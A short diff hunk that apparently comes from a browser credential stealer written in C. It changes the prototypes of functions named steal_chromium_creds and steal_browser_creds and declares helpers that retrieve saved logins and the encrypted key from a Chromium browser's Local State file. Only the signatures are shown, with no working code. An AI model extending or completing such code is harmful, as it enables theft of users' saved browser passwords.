@@ -11,8 +11,8 @@ typedef struct {
   PCWSTR localStatePath;
 } BrowserInfo;
 
-int steal_chromium_creds();
-static int steal_browser_creds(BrowserInfo browser);
+int steal_chromium_creds(Credential *, DWORD32 *);
+static int steal_browser_creds(BrowserInfo browser, Credential *, DWORD32 *);
 static int retrieve_logins(const PWSTR fullPath, int *loginCountOut,
                            Login *loginsOut[]);
 static int retrieve_encoded_key(PWSTR localStatePath, PSTR *encryptedKeyOut);
